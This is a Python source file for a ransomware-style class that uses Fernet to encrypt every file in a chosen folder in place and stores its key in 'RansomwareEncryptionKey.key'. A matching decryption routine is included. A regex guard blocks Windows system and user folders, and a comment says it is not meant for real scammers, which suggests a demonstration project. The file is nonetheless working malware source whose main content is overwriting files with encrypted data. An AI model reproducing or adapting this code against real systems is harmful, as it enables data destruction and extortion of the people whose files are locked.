import os
import re

from cryptography.fernet import Fernet
from os.path import exists


class Encryption:

    def __init__(self):
        if not self.__key_exists():
            self.__key = self.__create_key()
        else:
            self.__key = self.__load_key()
        self.__fern = Fernet(self.__key)

    @staticmethod
    def __create_key():
        key = Fernet.generate_key()
        with open("RansomwareEncryptionKey.key", "wb") as key_file:
            key_file.write(key)
        return key

    @staticmethod
    def __key_exists():
        return exists("RansomwareEncryptionKey.key")

    @staticmethod
    def __load_key():
        try:
            return open("RansomwareEncryptionKey.key", "rb").read()
        except FileNotFoundError:
            return Encryption.__create_key()

    # encrypt a file given the filename using the class encryption key. Returns true if successful, else false.
    def __encrypt_file(self, filename: str) -> bool:
        try:
            with open(filename, "rb") as encrypt_me_in:
                file_binary = encrypt_me_in.read()
            encrypted_binary = self.__fern.encrypt(file_binary)
            with open(filename, "wb") as write_me_out:
                write_me_out.write(encrypted_binary)
            return True
        except FileNotFoundError:
            print("File does not exist: " + filename)
        except Exception as e:
            print("Something went wrong in encrypt_file: " + e.__str__())
        return False

    # decrypts a file given the filename using the class encryption key. Returns true if successful, else false.
    def __decrypt_file(self, filename: str) -> bool:
        try:
            with open(filename, "rb") as file:
                encrypted_binary = file.read()
            decrypted_binary = self.__fern.decrypt(encrypted_binary)
            with open(filename, "wb") as file:
                file.write(decrypted_binary)
            return True
        except FileNotFoundError:
            print("File does not exist: " + filename)
        except Exception as e:
            print("Something went wrong in decrypt_file: " + e.__str__())
        return False

    # Take folder as input, return true if all contents encrypted, otherwise false
    def encrypt_folder_contents(self, folder_name: str) -> bool:
        if folder_name is None:
            exit()

        # Disallow encrypting of system files. We're not here to provide useful software to real world scammers...
        search_phrase = "^[A-z]:($|(/*|\\*)$|(/*|\\*)(Windows|Users|Program Files( [(]x86[)])?))"

        if not folder_name.endswith('/'):
            folder_name = folder_name.__add__('/')

        if re.search(search_phrase, folder_name):
            print("Malicious use detected. Exiting Encryption...")
            return False
        try:
            for file in os.listdir(os.fsencode(folder_name)):
                file_name = os.fsdecode(file)
                if not self.__encrypt_file(folder_name + file_name):
                    print("Failed to encrypt: " + folder_name + file_name)
                    return False

        except Exception as e:
            print("Error while encrypting. " + e.__str__())
            return False
        else:
            return True

    # Take folder as input, return true if decryption successful, false if an error occurred
    def decrypt_folder_contents(self, folder_name: str):
        if folder_name is None:
            exit()

        if not folder_name.endswith('/'):
            folder_name = folder_name.__add__('/')

        try:
            for file in os.listdir(os.fsencode(folder_name)):
                file_name = os.fsdecode(file)
                if not self.__decrypt_file(folder_name + file_name):
                    print("Failed to decrypt: " + folder_name + file_name)

        except Exception as e:
            print("Error while encrypting. " + e.__str__())
